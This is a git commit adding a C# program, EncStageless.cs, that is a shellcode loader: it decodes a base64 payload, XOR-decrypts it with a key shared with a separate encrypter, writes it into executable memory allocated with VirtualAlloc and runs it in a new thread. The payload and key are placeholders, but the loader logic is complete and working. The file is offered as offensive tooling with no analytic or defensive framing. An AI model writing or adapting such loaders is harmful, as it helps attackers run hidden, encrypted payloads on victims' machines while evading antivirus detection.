4bc40efa170637db0e287d69918f8cc9180802b3
kluo <15222944+kluo84@users.noreply.github.com>
2024-04-01 21:03:40 -0500

    Create EncStageless.cs

---
+++ EncStageless.cs
@@ -0,0 +1,51 @@
+
+using System;
+using System.Net;
+using System.Text;
+using System.Runtime.InteropServices;
+
+public class Program {
+  [DllImport("kernel32")]
+  private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
+
+  [DllImport("kernel32")]
+  private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);
+
+  [DllImport("kernel32")]
+  private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
+
+  private static UInt32 MEM_COMMIT = 0x1000;
+  private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
+  
+  private static byte[] xor(byte[] shell, byte[] KeyBytes)
+        {
+            for (int i = 0; i < shell.Length; i++)
+            {
+                shell[i] ^= KeyBytes[i % KeyBytes.Length];
+            }
+            return shell;
+        }
+  public static void Main()
+  {
+
+    string dataBS64 = "Output FROM ENCRYPTER.cs";
+    byte[] data = Convert.FromBase64String(dataBS64);
+
+    string key = "?????????"; //Same key in Encrypter.cs
+    //Convert Key into bytes
+    byte[] keyBytes = Encoding.ASCII.GetBytes(key);
+
+    byte[] encoded = xor(data, keyBytes);
+
+    UInt32 codeAddr = VirtualAlloc(0, (UInt32)encoded.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    Marshal.Copy(encoded, 0, (IntPtr)(codeAddr), encoded.Length);
+
+    IntPtr threadHandle = IntPtr.Zero;
+    UInt32 threadId = 0;
+    IntPtr parameter = IntPtr.Zero;
+    threadHandle = CreateThread(0, 0, codeAddr, parameter, 0, ref threadId);
+
+    WaitForSingleObject(threadHandle, 0xFFFFFFFF);
+
+  }
+}
